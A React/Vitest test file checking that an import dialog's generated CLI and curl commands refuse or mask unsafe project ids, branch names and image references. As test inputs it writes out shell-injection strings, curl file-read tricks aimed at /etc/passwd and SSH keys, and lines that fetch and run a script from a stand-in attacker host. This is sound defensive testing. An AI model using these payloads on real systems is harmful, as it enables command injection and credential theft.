import React from 'react';
import { render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { translate as t } from '@/test/i18n-mock';

vi.mock('react-i18next', async () => (await import('@/test/i18n-mock')).reactI18nextMock());
vi.mock('@/config/runtimeConfig', () => ({ getApiUrl: () => '/api' }));

import ImportCommandHint, { importCommands } from './ImportCommandHint';

const PROJECT = '11111111-2222-4333-8444-555555555555';
const API = `${window.location.origin}/api`;

/**
 * The commands the import dialog offers to copy run in the user's shell with
 * the user's token: no value may change what they do.
 */
describe('importCommands', () => {
  it('builds the quoted CLI and curl lines of a normal import', () => {
    expect(importCommands({ projectId: PROJECT, type: 'sast', branch: 'main' })).toEqual({
      cli: `cybedefend import --project-id ${PROJECT} --type sast --branch main results.sarif`,
      curl: `curl -X POST -H "Authorization: Bearer $CYBEDEFEND_TOKEN" -F file=@results.sarif --form-string type=sast --form-string branch=main --form-string format=sarif ${API}/project/${PROJECT}/scan/import/start`,
      producer: null,
      heldValues: false,
    });
  });

  it('sends the branch and the image as text fields, never as a file curl would read', () => {
    const commands = importCommands({ projectId: PROJECT, type: 'container', branch: 'main', image: 'ghcr.io/acme/api:v2' });
    expect(commands?.curl).toContain('--form-string branch=main --form-string image=ghcr.io/acme/api:v2');
    expect(commands?.curl.match(/ -F /g)).toHaveLength(1);
    expect(commands?.curl).toContain('-F file=@results.sarif');
  });

  it.each([
    '$(curl https://attacker.example/x.sh | sh)',
    `${PROJECT};id`,
    `${PROJECT} && id`,
    '`id`',
    "x'; id; echo '",
    '../../organization/x',
    '',
    'not-a-uuid',
  ])('offers no command for the project id %s', (projectId) => {
    expect(importCommands({ projectId, type: 'sast', branch: 'main' })).toBeNull();
  });

  // The commands may be pasted in POSIX shells, PowerShell, cmd.exe or fish:
  // a branch or an image is inserted only when it is made of characters every
  // one of them reads literally; otherwise the placeholder is shown.
  it.each([
    '</etc/passwd',
    '@/home/user/.ssh/id_rsa',
    '-o/tmp/x',
    '--config=/tmp/x',
    'a;$(id)',
    "it's my branch",
    'x’;calc;’',
    'x&calc',
    'x|calc',
    'x%PATH%',
    'x^&calc',
    'trailing\\',
    'x`calc`',
    'x\ny',
    'x y',
    'feature/été',
    'x=1',
    'v1+build',
  ])('shows the branch placeholder for %j', (branch) => {
    const commands = importCommands({ projectId: PROJECT, type: 'sast', branch });
    expect(commands?.cli).toContain('--branch <branch> results.sarif');
    expect(commands?.curl).toContain('--form-string branch=<branch>');
    expect(commands?.heldValues).toBe(true);
    expect(`${commands?.cli} ${commands?.curl}`).not.toContain(branch);
  });

  it.each(['main', 'feature/login-form', 'release-1.2.3', 'fix_crash', 'renovate/lodash-4.x', 'v2.0'])(
    'inserts the branch %j as it is',
    (branch) => {
      const commands = importCommands({ projectId: PROJECT, type: 'sast', branch });
      expect(commands?.cli).toContain(`--branch ${branch} results.sarif`);
      expect(commands?.heldValues).toBe(false);
    },
  );

  it.each(['<x', '@x', '-x', 'x&calc', 'ghcr.io/acme/api:v2;id', 'x’'])(
    'shows the image placeholder for %j',
    (image) => {
      const commands = importCommands({ projectId: PROJECT, type: 'container', branch: 'main', image });
      expect(commands?.cli).toContain('--image <image>');
      expect(commands?.curl).toContain('--form-string image=<image>');
      expect(commands?.producer).toBe('trivy image --format sarif -o results.sarif <image>');
      expect(commands?.heldValues).toBe(true);
    },
  );

  it('inserts an image reference with a tag and a digest', () => {
    const image = `ghcr.io/acme/api:v2@sha256:${'a'.repeat(64)}`;
    const commands = importCommands({ projectId: PROJECT, type: 'container', branch: 'main', image });
    expect(commands?.cli).toContain(`--image ${image}`);
    expect(commands?.heldValues).toBe(false);
  });
});

describe('ImportCommandHint', () => {
  it('shows no command line for a hostile project id', () => {
    render(<ImportCommandHint projectId={'x;curl attacker.example|sh'} type="sast" branch="main" />);
    expect(screen.queryByText(/cybedefend import/)).toBeNull();
    expect(screen.queryByText(/curl -X POST/)).toBeNull();
    expect(screen.getByText(t('components.importResults.hint.unavailable'))).toBeInTheDocument();
  });

  it('shows the placeholder and says why for a branch a shell could misread', () => {
    render(<ImportCommandHint projectId={PROJECT} type="sast" branch="<~/x-credentials" />);
    expect(screen.getByText(/--form-string branch=<branch>/)).toBeInTheDocument();
    expect(screen.queryByText(/x-credentials/)).toBeNull();
    expect(screen.getByText(t('components.importResults.hint.placeholder'))).toBeInTheDocument();
  });
});
